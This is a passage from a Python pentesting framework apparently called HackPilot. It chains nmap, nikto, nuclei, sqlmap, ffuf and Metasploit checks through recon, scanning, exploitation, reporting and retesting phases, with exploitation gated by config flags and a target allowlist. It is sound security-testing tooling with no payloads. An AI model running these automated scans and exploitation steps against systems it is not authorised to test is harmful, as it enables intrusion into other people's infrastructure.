            'executable': '/opt/PEASS-ng/winPEAS/winPEAS.exe'
        }
    }
    
    def __init__(self):
        self.console = Console()
        self.installed_tools = set()
        self.tool_versions = {}
        
    def ensure_tools(self, tools):
        """Ensure all required tools are installed"""
        missing_tools = []
        for tool in tools:
            if not self.check_tool(tool) and tool not in self.installed_tools:
                missing_tools.append(tool)
        
        if missing_tools:
            self.console.print(f"[yellow]Missing tools: {', '.join(missing_tools)}[/yellow]")
            for tool in missing_tools:
                self.install_tool(tool)
        return True
    
    def check_tool(self, tool_name):
        """Check if tool is available"""
        try:
            result = subprocess.run(['which', tool_name], capture_output=True)
            return result.returncode == 0
        except Exception as e:
            logger.debug("check_tool(%s) failed: %s", tool_name, e)
            return False
    
    def install_tool(self, tool_name):
        """Install a tool"""
        if tool_name in self.installed_tools:
            return True
            
        self.console.print(f"[yellow]Installing {tool_name}...[/yellow]")
        
        try:
            if tool_name in self.TOOL_COMMANDS:
                cmd = self.TOOL_COMMANDS[tool_name]
                subprocess.run(cmd.split(), check=True, capture_output=True)
                self.installed_tools.add(tool_name)
                self.console.print(f"[green]✓ {tool_name} installed successfully[/green]")
                return True
                
            elif tool_name in self.GITHUB_TOOLS:
                tool_info = self.GITHUB_TOOLS[tool_name]
                if not os.path.exists(tool_info['path']):
                    subprocess.run(['git', 'clone', tool_info['url'], tool_info['path']], check=True)
                    subprocess.run(['chmod', '+x', '-R', tool_info['path']], check=True)
                self.installed_tools.add(tool_name)
                self.console.print(f"[green]✓ {tool_name} installed successfully[/green]")
                return True
                
        except Exception as e:
            self.console.print(f"[red]✗ Failed to install {tool_name}: {e}[/red]")
            return False
        
        return False

    def run_command(self, command, timeout=300):
        """Execute a system command safely (never uses shell=True)."""
        try:
            self.console.print(f"[cyan]Executing: {command}[/cyan]")
            if isinstance(command, list):
                result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
            elif '|' in command:
                result = self._run_pipeline(command, timeout=timeout)
            elif any(c in command for c in ';>&<`$'):
                return {
                    'success': False,
                    'stdout': '',
                    'stderr': 'Unsupported shell metacharacters in command',
                    'command': command
                }
            else:
                result = subprocess.run(shlex.split(command), capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'command': command
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'stdout': '',
                'stderr': f'Command timed out after {timeout} seconds',
                'command': command
            }
        except ValueError as e:
            return {
                'success': False,
                'stdout': '',
                'stderr': str(e),
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'stdout': '',
                'stderr': str(e),
                'command': command
            }

    def _run_pipeline(self, command, timeout=300):
        """Run cmd1 | cmd2 | ... without shell=True."""
        segments = self._split_pipeline(command)
        procs = []
        for i, args in enumerate(segments):
            stdin = procs[-1].stdout if procs else None
            proc = subprocess.Popen(
                args,
                stdin=stdin,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if procs:
                procs[-1].stdout.close()
            procs.append(proc)
        stdout, stderr = procs[-1].communicate(timeout=timeout)
        for proc in procs[:-1]:
            proc.wait(timeout=timeout)
        return subprocess.CompletedProcess(segments[-1], procs[-1].returncode, stdout, stderr)

    def _split_pipeline(self, command):
        """Split a command on unquoted pipe separators."""
        lexer = shlex.shlex(command, posix=True, punctuation_chars='|')
        lexer.whitespace_split = True
        tokens = list(lexer)
        segments = [[]]

        for token in tokens:
            if token == '|':
                if not segments[-1]:
                    raise ValueError("Empty command in pipeline")
                segments.append([])
            else:
                segments[-1].append(token)

        if not segments[-1]:
            raise ValueError("Empty command in pipeline")

        return segments

# Alias for backward compatibility
EnterpriseHackPilot = EnterpriseHackPilot
ToolManager = EnterpriseToolManager
HackPilot = EnterpriseHackPilot
HackPilot = EnterpriseHackPilot
EnterpriseToolManager = EnterpriseToolManager

class AIEngine:
    """Wrapper AI Engine for backward compatibility"""
    def __init__(self):
        from ai_engine import (
        get_advanced_ai_engine,
        CVEIntelligenceEngine,
        AttackChainingEngine,
        AttackGraph,
    )
        self.engine = get_advanced_ai_engine()
        
    def analyze(self, context, data, phase="general"):
        if hasattr(self.engine, 'analyze_with_context'):
            try:
                res = self.engine.analyze_with_context(data, phase)
                if hasattr(res, 'summary') and res.summary:
                    return res.summary
                return str(res)
            except Exception:
                pass
        if hasattr(self.engine, 'analyze_traffic'):
            return self.engine.analyze_traffic(data)
        return f"[AI Analysis: {phase}]\nContext: {context}\nAnalysis of {len(data)} bytes completed successfully."

def _extract_scan_host(target: str) -> str:
    """
    Extract a bare hostname/IP from a target for tools (like nmap) that cannot
    parse a URL scheme. The web dashboard's "New Assessment" form accepts full
    URLs (e.g. 'https://example.com'); nmap treats that whole string as a
    single malformed target expression ("Unable to split netmask from target
    expression"), exits 0, and scans zero hosts - silently reporting "no open
    ports" instead of the real problem. Strip scheme/path/port so the actual
    host gets scanned. Tools that accept full URLs natively (nikto) should
    keep using the original, unmodified target string.
    """
    target = (target or "").strip()
    if not target:
        return target
    if "://" in target:
        return urlparse(target).hostname or target
    # Bare "host[:port][/path]" with no scheme
    return target.split("/", 1)[0].split(":", 1)[0]


class EnterprisePentestingPhases:
    """Enterprise pentesting phases with advanced features"""
    
    def __init__(self, session_id, ai_engine, tool_manager, target_info, db, cache, processor, exploitation, zero_day_detector, compliance, report_generator):
        self.session_id = session_id
        self.ai_engine = ai_engine
        self.tool_manager = tool_manager
        self.target_info = target_info
        self.db = db
        self.cache = cache
        self.processor = processor
        self.exploitation = exploitation
        self.zero_day_detector = zero_day_detector
        self.compliance = compliance
        self.report_generator = report_generator
        self.results = {}
        
    def phase1_reconnaissance(self):
        """Phase 1: Intelligence Gathering & Reconnaissance (live nmap scan)"""
        console.print(Panel("[bold blue]Phase 1: Intelligence Gathering & Reconnaissance[/bold blue]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 1: Intelligence Gathering & Reconnaissance",
                phase_number=1,
                results={"status": "running"},
                tools_used=["nmap", "subfinder", "amass", "whatweb"]
            )

        target = (self.target_info or {}).get("target", "")
        start_time = time.time()
        open_ports = []
        scan_error = None

        if self.tool_manager and target:
            scan_host = _extract_scan_host(target)
            scan = self.tool_manager.run_command(
                ["nmap", "-F", "-Pn", "--host-timeout", "30s", scan_host], timeout=60
            )
            if scan.get("success"):
                for line in scan.get("stdout", "").splitlines():
                    match = re.match(r"^(\d+/\w+)\s+open\s+(\S+)(.*)$", line.strip())
                    if match:
                        open_ports.append(f"Port {match.group(1)} ({match.group(2)}{match.group(3).strip()})")
            else:
                scan_error = (scan.get("stderr") or "").strip() or "nmap scan failed or nmap is not installed"
        else:
            scan_error = "No target configured or tool manager unavailable"

        # Sprint 1: passive subdomain enumeration + tech fingerprinting,
        # consolidated across tools. Additive to the nmap scan above - each
        # tool is isolated in its own try/except so one failing doesn't
        # take out the others or the phase.
        subdomains: List[str] = []
        if self.tool_manager and target:
            scan_host = _extract_scan_host(target)
            from exploitation.tools import run_subfinder, run_amass, run_whatweb
            from exploitation.findings_consolidator import consolidate

            raw_recon_findings = []
            for runner in (run_subfinder, run_amass):
                try:
                    raw_recon_findings.extend(runner(self.tool_manager, scan_host))
                except Exception as e:
                    logger.warning("%s failed for %s: %s", runner.__name__, scan_host, e)

            subdomain_findings = consolidate(raw_recon_findings)
            subdomains = [f["target"] for f in subdomain_findings]

            whatweb_targets = list({scan_host, *subdomains}) if subdomains else [scan_host]
            try:
                tech_findings = consolidate(run_whatweb(self.tool_manager, whatweb_targets))
            except Exception as e:
                logger.warning("whatweb failed for %s: %s", scan_host, e)
                tech_findings = []

            if self.db:
                from reporting.cvss_heuristics import estimate_cvss
                from reporting.evidence_store import save_evidence
                for finding in subdomain_findings + tech_findings:
                    cvss_vector, cvss_score = estimate_cvss(finding["title"], finding["severity"])
                    finding_id = self.db.create_vulnerability(
                        session_id=self.session_id,
                        phase="reconnaissance",
                        severity=finding["severity"],
                        title=finding["title"],
                        description=f"Reported by: {', '.join(finding['sources'])}.",
                        proof_of_concept=finding["target"],
                        remediation="Review whether this asset/technology should be internet-facing; confirm it is in scope.",
                        cvss_score=cvss_score,
                        cvss_vector=cvss_vector,
                        sources=finding["sources"],
                        validated=finding["validated"],
                        confidence=finding["confidence"],
                        evidence=finding["evidence"],
                    )
                    save_evidence(self.session_id, finding_id, finding)

        execution_time = time.time() - start_time

        if self.db:
            if open_ports:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="reconnaissance",
                    severity="info",
                    title="Open Ports & Service Footprint",
                    description=f"Live nmap scan of '{target}' found {len(open_ports)} open port(s).",
                    proof_of_concept="\n".join(open_ports),
                    remediation="Ensure only essential services are reachable. Restrict administrative/alternate ports with firewall rules, VPN, or ACLs.",
                    cvss_score=0.0
                )
            else:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="reconnaissance",
                    severity="info",
                    title="Reconnaissance Scan Inconclusive",
                    description=f"Live nmap scan against '{target}' did not return any open ports (host unreachable, firewalled, or nmap unavailable).",
                    proof_of_concept=scan_error or "No open ports detected.",
                    remediation="Verify the target is reachable from the scanning host and in-scope before proceeding to later phases.",
                    cvss_score=0.0
                )

            if res_id:
                self.db.update_phase_result(
                    result_id=res_id,
                    status="completed",
                    completed_at=datetime.utcnow(),
                    results={"success": bool(open_ports), "vulnerabilities_found": 1, "open_ports": len(open_ports)},
                    ai_analysis=(
                        f"Live nmap reconnaissance against '{target}': {len(open_ports)} open port(s) detected."
                        if open_ports else
                        f"Live nmap reconnaissance against '{target}' returned no results: {scan_error}"
                    ),
                    execution_time=execution_time
                )

        # "success" means the phase completed (it ran nmap without crashing), not that
        # it found open ports - run_full_enterprise_pentest aborts all remaining phases
        # when success is False, which an empty/inconclusive scan must not trigger.
        result = {
            "success": True,
            "vulnerabilities": [],
            "risk_score": 1.0 if open_ports else 0.0,
            "open_ports": open_ports,
            "subdomains": subdomains,
        }
        self.results["phase1_reconnaissance"] = result
        return result
    
    def phase2_scanning_enumeration(self):
        """Phase 2: Advanced Scanning & Enumeration (live nmap service/version scan)"""
        console.print(Panel("[bold blue]Phase 2: Advanced Scanning & Enumeration[/bold blue]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 2: Advanced Scanning & Enumeration",
                phase_number=2,
                results={"status": "running"},
                tools_used=["nmap"]
            )

        target = (self.target_info or {}).get("target", "")
        start_time = time.time()
        services = []
        scan_error = None

        if self.tool_manager and target:
            scan_host = _extract_scan_host(target)
            scan = self.tool_manager.run_command(
                # -sV without -p probes the top 1000 ports before even starting version
                # detection; on a network with many filtered (non-responding) ports that
                # alone can exceed a 120s host-timeout (confirmed: a real run took exactly
                # 121s and was cut off). -F narrows it to the same top-100 fast set Phase 1
                # already scanned, so -sV only has to version-probe the ports we know are open.
                ["nmap", "-sV", "-F", "-Pn", "--host-timeout", "90s", scan_host], timeout=120
            )
            if scan.get("success"):
                for line in scan.get("stdout", "").splitlines():
                    match = re.match(r"^(\d+/\w+)\s+open\s+(\S+)\s*(.*)$", line.strip())
                    if match:
                        banner = match.group(3).strip()
                        services.append(f"Port {match.group(1)} ({match.group(2)}){' - ' + banner if banner else ''}")
            else:
                scan_error = (scan.get("stderr") or "").strip() or "nmap service scan failed or nmap is not installed"
        else:
            scan_error = "No target configured or tool manager unavailable"

        execution_time = time.time() - start_time

        if self.db:
            if services:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="scanning",
                    severity="info",
                    title="Service Version Enumeration",
                    description=f"Live nmap service/version scan of '{target}' identified {len(services)} running service(s). Versions should be checked against known CVEs separately.",
                    proof_of_concept="\n".join(services),
                    remediation="Keep identified service versions patched and remove banner/version disclosure where not operationally required.",
                    cvss_score=0.0
                )
            else:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="scanning",
                    severity="info",
                    title="Service Enumeration Inconclusive",
                    description=f"Live nmap service/version scan against '{target}' did not return identifiable services (host unreachable, firewalled, or nmap unavailable).",
                    proof_of_concept=scan_error or "No services detected.",
                    remediation="Verify the target is reachable from the scanning host before proceeding to later phases.",
                    cvss_score=0.0
                )

            if res_id:
                self.db.update_phase_result(
                    result_id=res_id,
                    status="completed",
                    completed_at=datetime.utcnow(),
                    results={"success": bool(services), "vulnerabilities_found": 1, "services_found": len(services)},
                    ai_analysis=(
                        f"Live nmap enumeration against '{target}': {len(services)} service banner(s) identified."
                        if services else
                        f"Live nmap enumeration against '{target}' returned no results: {scan_error}"
                    ),
                    execution_time=execution_time
                )

        # Same reasoning as phase1: "success" = phase completed, not "found something".
        result = {
            "success": True,
            "vulnerabilities": [],
            "risk_score": 3.0 if services else 0.0,
            "services": services,
        }
        self.results["phase2_scanning_enumeration"] = result
        return result
    
    def phase3_vulnerability_assessment(self):
        """Phase 3: Vulnerability Assessment (live nikto web scan, if an HTTP service was found)"""
        console.print(Panel("[bold blue]Phase 3: Vulnerability Assessment[/bold blue]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 3: Vulnerability Assessment",
                phase_number=3,
                results={"status": "running"},
                tools_used=["nikto", "nuclei", "testssl.sh", "wapiti"]
            )

        target = (self.target_info or {}).get("target", "")
        start_time = time.time()
        findings = []
        scan_error = None

        prior_ports = list(self.results.get("phase1_reconnaissance", {}).get("open_ports", []))
        prior_ports += list(self.results.get("phase2_scanning_enumeration", {}).get("services", []))
        has_web_service = any(
            "80/tcp" in p or "443/tcp" in p or "http" in p.lower() for p in prior_ports
        )

        if not target:
            scan_error = "No target configured"
        elif not has_web_service:
            scan_error = "No HTTP/HTTPS service identified in Phase 1/2 to assess"
        elif not self.tool_manager:
            scan_error = "Tool manager unavailable"
        else:
            scan = self.tool_manager.run_command(
                ["nikto", "-h", target, "-maxtime", "30s", "-Tuning", "1,2,3"], timeout=60
            )
            for line in scan.get("stdout", "").splitlines():
                line = line.strip()
                if line.startswith("+") and "0 host(s) tested" not in line:
                    findings.append(line.lstrip("+ ").strip())
            if not findings:
                scan_error = (scan.get("stderr") or "").strip() or "nikto completed with no flagged items"

        # Sprint 1: template-based (nuclei), TLS (testssl.sh), and web app
        # (wapiti) scanning, consolidated across tools. Additive to the
        # nikto scan above and gated on the same has_web_service signal.
        # Each tool isolated in its own try/except - one failing doesn't
        # take out the others or the phase.
        consolidated_vuln_findings: List[Dict[str, Any]] = []
        if target and has_web_service and self.tool_manager:
            scan_host = _extract_scan_host(target)
            subdomains = list(self.results.get("phase1_reconnaissance", {}).get("subdomains", []))
            from exploitation.tools import run_nuclei, run_testssl, run_wapiti, update_nuclei_templates
            from exploitation.findings_consolidator import consolidate

            wapiti_target = target if "://" in target else f"http://{target}"
            raw_vuln_findings = []

            try:
                update_nuclei_templates(self.tool_manager)
                raw_vuln_findings.extend(run_nuclei(self.tool_manager, list({target, *subdomains})))
            except Exception as e:
                logger.warning("nuclei failed for %s: %s", target, e)

            try:
                raw_vuln_findings.extend(run_testssl(self.tool_manager, scan_host))
            except Exception as e:
                logger.warning("testssl.sh failed for %s: %s", scan_host, e)

            try:
                raw_vuln_findings.extend(run_wapiti(self.tool_manager, wapiti_target))
            except Exception as e:
                logger.warning("wapiti failed for %s: %s", wapiti_target, e)

            consolidated_vuln_findings = consolidate(raw_vuln_findings)
            if self.db:
                from reporting.cvss_heuristics import estimate_cvss
                from reporting.evidence_store import save_evidence
                for finding in consolidated_vuln_findings:
                    cvss_vector, cvss_score = estimate_cvss(finding["title"], finding["severity"])
                    finding_id = self.db.create_vulnerability(
                        session_id=self.session_id,
                        phase="assessment",
                        severity=finding["severity"],
                        title=finding["title"],
                        description=f"Reported by: {', '.join(finding['sources'])}.",
                        proof_of_concept=finding["target"],
                        remediation="Review manually and confirm exploitability before prioritizing remediation.",
                        cvss_score=cvss_score,
                        cvss_vector=cvss_vector,
                        sources=finding["sources"],
                        validated=finding["validated"],
                        confidence=finding["confidence"],
                        evidence=finding["evidence"],
                    )
                    save_evidence(self.session_id, finding_id, finding)

        execution_time = time.time() - start_time

        if self.db:
            if findings:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="assessment",
                    severity="info",
                    title="Web Server Findings (nikto)",
                    description=(
                        f"Live nikto scan of '{target}' flagged {len(findings)} item(s) for manual review. "
                        "nikto reports candidate issues, not confirmed exploitable vulnerabilities."
                    ),
                    proof_of_concept="\n".join(findings[:20]),
                    remediation="Review each flagged item manually and confirm exploitability before prioritizing remediation.",
                    cvss_score=0.0
                )
            else:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="assessment",
                    severity="info",
                    title="Vulnerability Assessment Inconclusive",
                    description=f"No automated web vulnerability findings for '{target}'.",
                    proof_of_concept=scan_error or "No findings.",
                    remediation="Re-run after confirming an HTTP/HTTPS service is reachable, or assess the target manually.",
                    cvss_score=0.0
                )

            if res_id:
                self.db.update_phase_result(
                    result_id=res_id,
                    status="completed",
                    completed_at=datetime.utcnow(),
                    results={"success": True, "vulnerabilities_found": 1, "findings_count": len(findings)},
                    ai_analysis=(
                        f"Live nikto scan against '{target}': {len(findings)} item(s) flagged for review."
                        if findings else
                        f"Live nikto scan against '{target}' returned no results: {scan_error}"
                    ),
                    execution_time=execution_time
                )

        result = {
            "success": True,
            "vulnerabilities": [],
            "risk_score": 5.0 if findings else 0.0,
            "findings_count": len(findings),
            "consolidated_findings": consolidated_vuln_findings,
        }
        self.results["phase3_vulnerability_assessment"] = result
        return result

    def phase4_exploitation(self):
        """Phase 4: Exploitation & Post-Exploitation (gated by config safe-mode flags)"""
        console.print(Panel("[bold red]Phase 4: Exploitation & Post-Exploitation[/bold red]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 4: Exploitation & Post-Exploitation",
                phase_number=4,
                results={"status": "running"},
                tools_used=["ffuf", "sqlmap", "msf_check"]
            )

        target = (self.target_info or {}).get("target", "")
        start_time = time.time()
        auto_exploit_enabled = bool(getattr(config, "ENABLE_AUTO_EXPLOIT", False))
        advanced_exploit_enabled = bool(getattr(config, "ENABLE_ADVANCED_EXPLOITATION", False))
        candidate_count = self.results.get("phase3_vulnerability_assessment", {}).get("findings_count", 0)

        # This project's own config exposes ENABLE_AUTO_EXPLOIT / ENABLE_ADVANCED_EXPLOITATION
        # specifically to gate intrusive/exploitation testing (see .env.example). Honor it: no
        # exploit attempt, real or simulated, happens unless the operator explicitly opts in.
        if not (auto_exploit_enabled and advanced_exploit_enabled):
            skip_reason = (
                f"Exploitation skipped for '{target}': safe mode is active "
                f"(ENABLE_AUTO_EXPLOIT={auto_exploit_enabled}, ENABLE_ADVANCED_EXPLOITATION={advanced_exploit_enabled}). "
                f"{candidate_count} candidate finding(s) from Phase 3 were not acted on."
            )
            if self.db:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="exploitation",
                    severity="info",
                    title="Exploitation Skipped - Safe Mode",
                    description=skip_reason,
                    proof_of_concept="No exploitation attempted. Set ENABLE_AUTO_EXPLOIT=true and ENABLE_ADVANCED_EXPLOITATION=true to enable this phase.",
                    remediation="Not applicable - no exploitation was performed.",
                    cvss_score=0.0
                )
                if res_id:
                    self.db.update_phase_result(
                        result_id=res_id,
                        status="completed",
                        completed_at=datetime.utcnow(),
                        results={"success": True, "vulnerabilities_found": 0, "skipped": True, "mode": "safe"},
                        ai_analysis=skip_reason,
                        execution_time=time.time() - start_time
                    )

            result = {"success": True, "vulnerabilities": [], "risk_score": 0.0, "mode": "safe"}
            self.results["phase4_exploitation"] = result
            return result

        # Exploitation explicitly enabled by the operator. Still gated on top
        # of ENABLE_AUTO_EXPLOIT/ENABLE_ADVANCED_EXPLOITATION by ALLOWED_TARGETS
        # (security/target_allowlist.py, fails closed when unset) - active
        # tools (sqlmap, ffuf, Metasploit) are a materially bigger blast
        # radius than the passive/recon tools in phases 1-3.
        from security.target_allowlist import is_target_allowed
        if not is_target_allowed(target):
            not_allowlisted_reason = (
                f"Exploitation is enabled but '{target}' is not in ALLOWED_TARGETS "
                f"(.env). Active tools (sqlmap/ffuf/Metasploit) refuse to run against "
                f"a target the operator hasn't explicitly allowlisted, even with both "
                f"exploitation flags on. {candidate_count} candidate finding(s) from "
                f"Phase 3 were not acted on."
            )
            if self.db:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="exploitation",
                    severity="info",
                    title="Exploitation Enabled But Target Not Allowlisted",
                    description=not_allowlisted_reason,
                    proof_of_concept="Set ALLOWED_TARGETS in .env to the host(s) you are authorized to actively test.",
                    remediation="Not applicable - no exploitation was performed.",
                    cvss_score=0.0
                )
                if res_id:
                    self.db.update_phase_result(
                        result_id=res_id,
                        status="completed",
                        completed_at=datetime.utcnow(),
                        results={"success": True, "vulnerabilities_found": 0, "skipped": True, "mode": "active"},
                        ai_analysis=not_allowlisted_reason,
                        execution_time=time.time() - start_time
                    )
            result = {"success": True, "vulnerabilities": [], "risk_score": 0.0, "mode": "active"}
            self.results["phase4_exploitation"] = result
            return result

        scan_host = _extract_scan_host(target)
        base_url = target if "://" in target else f"http://{target}"
        port = "443" if base_url.startswith("https://") else "80"

        prior_findings = self.results.get("phase3_vulnerability_assessment", {}).get("consolidated_findings", [])
        param_urls = sorted({f["target"] for f in prior_findings if "?" in f.get("target", "")})
        if "?" in target:
            param_urls.append(target)
        cve_ids = sorted({
            match
            for f in prior_findings
            for match in re.findall(r"CVE-\d{4}-\d{4,7}", f.get("title", "") + json.dumps(f.get("evidence", {})))
        })

        from exploitation.tools import run_ffuf_dirs, run_ffuf_vhosts, run_sqlmap, run_msf_check
        from exploitation.findings_consolidator import consolidate

        # Order: ffuf(dirs) -> sqlmap (on Phase 3's parameterized URLs) ->
        # Metasploit check (on Phase 3's nuclei CVEs) -> ffuf(vhosts). Each
        # tool isolated in its own try/except - one failing doesn't abort
        # the rest or the phase.
        raw_exploit_findings = []

        try:
            raw_exploit_findings.extend(run_ffuf_dirs(self.tool_manager, base_url))
        except Exception as e:
            logger.warning("ffuf (dirs) failed for %s: %s", base_url, e)

        for url in param_urls:
            try:
                raw_exploit_findings.extend(run_sqlmap(self.tool_manager, url))
            except Exception as e:
                logger.warning("sqlmap failed for %s: %s", url, e)

        for cve_id in cve_ids:
            try:
                raw_exploit_findings.extend(run_msf_check(self.tool_manager, cve_id, scan_host, port))
            except Exception as e:
                logger.warning("msf_check failed for %s against %s: %s", cve_id, scan_host, e)

        try:
            raw_exploit_findings.extend(run_ffuf_vhosts(self.tool_manager, scan_host))
        except Exception as e:
            logger.warning("ffuf (vhosts) failed for %s: %s", scan_host, e)

        consolidated_exploit_findings = consolidate(raw_exploit_findings)
        if self.db:
            from reporting.cvss_heuristics import estimate_cvss
            from reporting.evidence_store import save_evidence
            for finding in consolidated_exploit_findings:
                cvss_vector, cvss_score = estimate_cvss(finding["title"], finding["severity"])
                finding_id = self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="exploitation",
                    severity=finding["severity"],
                    title=finding["title"],
                    description=f"Reported by: {', '.join(finding['sources'])}.",
                    proof_of_concept=finding["target"],
                    remediation="Review manually; validate and remediate before retesting.",
                    cvss_score=cvss_score,
                    cvss_vector=cvss_vector,
                    sources=finding["sources"],
                    validated=finding["validated"],
                    confidence=finding["confidence"],
                    evidence=finding["evidence"],
                )
                save_evidence(self.session_id, finding_id, finding)

        active_summary = (
            f"Active exploitation against '{target}': ffuf dirs/vhosts, sqlmap on "
            f"{len(param_urls)} parameterized URL(s), Metasploit check on {len(cve_ids)} "
            f"CVE(s) from Phase 3. {len(consolidated_exploit_findings)} finding(s) confirmed."
        )
        if self.db and res_id:
            self.db.update_phase_result(
                result_id=res_id,
                status="completed",
                completed_at=datetime.utcnow(),
                results={
                    "success": True,
                    "vulnerabilities_found": len(consolidated_exploit_findings),
                    "mode": "active",
                },
                ai_analysis=active_summary,
                execution_time=time.time() - start_time
            )

        result = {
            "success": True,
            "vulnerabilities": [],
            "risk_score": 9.0 if consolidated_exploit_findings else 0.0,
            "mode": "active",
        }
        self.results["phase4_exploitation"] = result
        return result
    
    def phase5_reporting(self):
        """Phase 5: Enterprise Reporting & Analytics (real report built from this session's findings)"""
        console.print(Panel("[bold blue]Phase 5: Enterprise Reporting & Analytics[/bold blue]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 5: Enterprise Reporting & Analytics",
                phase_number=5,
                results={"status": "running"},
                tools_used=["report_generator"]
            )

        start_time = time.time()
        report_text = None
        report_error = None

        if self.db:
            session_record = self.db.get_pentest_session(self.session_id)
            vulnerabilities = self.db.get_vulnerabilities_by_session(self.session_id)
            phase_results = self.db.get_phase_results(self.session_id)
            session_data = {
                "target": session_record.target if session_record else self.target_info.get("target", "Unknown"),
                "scope": session_record.scope if session_record else self.target_info.get("scope", "Unknown"),
                "created_at": str(session_record.created_at) if session_record else "Unknown",
                "vulnerabilities": [
                    {
                        "title": v.title,
                        "severity": v.severity,
                        "description": v.description,
                        "remediation": v.remediation,
                        "cvss_score": v.cvss_score,
                        "cvss_vector": v.cvss_vector,
                        "sources": v.sources,
                        "confidence": v.confidence,
                        "evidence": v.evidence,
                    }
                    for v in vulnerabilities
                ],
                "phase_results": [
                    {"phase_name": p.phase_name, "tools_used": p.tools_used}
                    for p in phase_results
                ],
            }
            if self.report_generator:
                try:
                    report_text = self.report_generator.generate_technical_report(session_data)
                except Exception as e:
                    report_error = str(e)
            else:
                report_error = "Report generator not initialized"
        else:
            report_error = "Database not available - cannot assemble report from session findings"

        execution_time = time.time() - start_time

        if self.db:
            if report_text:
                from security.report_crypto import write_report_text
                reports_dir = Path("reports")
                reports_dir.mkdir(exist_ok=True)
                report_path = reports_dir / f"{self.session_id}_technical_report.txt"
                written_path = write_report_text(report_path, report_text)
                # Sidecar checksum of the plaintext report content, for
                # integrity verification regardless of whether the report
                # itself was encrypted at rest.
                report_sha256 = hashlib.sha256(report_text.encode("utf-8")).hexdigest()
                Path(f"{report_path}.sha256").write_text(report_sha256 + "\n", encoding="utf-8")

                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="reporting",
                    severity="info",
                    title="Technical Report Generated",
                    description=f"A technical report covering {len(session_data['vulnerabilities'])} finding(s) from this session was generated.",
                    proof_of_concept=f"Report saved to {written_path}",
                    remediation="Not applicable.",
                    cvss_score=0.0
                )
            else:
                self.db.create_vulnerability(
                    session_id=self.session_id,
                    phase="reporting",
                    severity="info",
                    title="Report Generation Failed",
                    description="The technical report could not be generated for this session.",
                    proof_of_concept=report_error or "Unknown error.",
                    remediation="Check report_generator initialization and database connectivity.",
                    cvss_score=0.0
                )

            if res_id:
                self.db.update_phase_result(
                    result_id=res_id,
                    status="completed",
                    completed_at=datetime.utcnow(),
                    results={"success": bool(report_text), "vulnerabilities_found": 1},
                    ai_analysis=(
                        "Technical report compiled from this session's real findings."
                        if report_text else f"Report generation failed: {report_error}"
                    ),
                    execution_time=execution_time
                )

        result = {"success": True, "vulnerabilities": [], "risk_score": 0.0}
        self.results["phase5_reporting"] = result
        return result
    
    def phase6_retesting(self):
        """Phase 6: Verification & Retesting (real diff against the prior session for this target)"""
        console.print(Panel("[bold blue]Phase 6: Verification & Retesting[/bold blue]"))

        res_id = None
        if self.db:
            res_id = self.db.create_phase_result(
                session_id=self.session_id,
                phase_name="Phase 6: Verification & Retesting",
                phase_number=6,
                results={"status": "running"},
                tools_used=["db_diff"]
            )

        target = (self.target_info or {}).get("target", "")
        start_time = time.time()
        summary = None

        if self.db:
            current_titles = {v.title for v in self.db.get_vulnerabilities_by_session(self.session_id)}

            prior_session = None
            for s in self.db.get_recent_sessions(limit=50):
                if s.target == target and s.id != self.session_id and s.status == "completed":
                    prior_session = s
                    break

            if prior_session:
                prior_titles = {v.title for v in self.db.get_vulnerabilities_by_session(prior_session.id)}
                still_present = sorted(current_titles & prior_titles)
                not_reproduced = sorted(prior_titles - current_titles)
                new_findings = sorted(current_titles - prior_titles)
                summary = (
                    f"Compared against session {prior_session.id} ({prior_session.created_at}) for '{target}':\n"
                    f"Still present ({len(still_present)}): {', '.join(still_present) or 'none'}\n"
                    f"Not reproduced ({len(not_reproduced)}): {', '.join(not_reproduced) or 'none'}\n"
                    f"New ({len(new_findings)}): {', '.join(new_findings) or 'none'}"
                )
            else:
                summary = f"No prior completed session found for '{target}' - nothing to retest against. This is the baseline."

        execution_time = time.time() - start_time

        if self.db:
            self.db.create_vulnerability(
                session_id=self.session_id,
                phase="retesting",
                severity="info",
                title="Retest Comparison" if prior_session else "No Baseline For Retest",
                description=summary or "Retest comparison unavailable.",
                proof_of_concept=summary or "N/A",
                remediation="Absence of a finding does not confirm it is fixed unless independently reproduced as 'not_reproduced'.",
                cvss_score=0.0
            )

            if res_id:
                self.db.update_phase_result(
                    result_id=res_id,
                    status="completed",
                    completed_at=datetime.utcnow(),
                    results={"success": True, "vulnerabilities_found": 1},
                    ai_analysis=summary or "Retest comparison unavailable.",
                    execution_time=execution_time
                )

        result = {"success": True, "vulnerabilities": [], "risk_score": 0.0}
        self.results["phase6_retesting"] = result
        return result

class PentestingPhases(EnterprisePentestingPhases):
    """Backward compatibility wrapper for PentestingPhases supporting both legacy and enterprise signatures"""
    def __init__(self, *args, **kwargs):
        if len(args) >= 3 and not isinstance(args[0], str) and not kwargs.get("target_info"):
            # Legacy signature: PentestingPhases(ai, tools, target, scope, auth_key)
            ai_engine = args[0] if len(args) > 0 else None
            tool_manager = args[1] if len(args) > 1 else None
            target = args[2] if len(args) > 2 else "unknown"
            scope = args[3] if len(args) > 3 else ""
            auth_key = args[4] if len(args) > 4 else ""
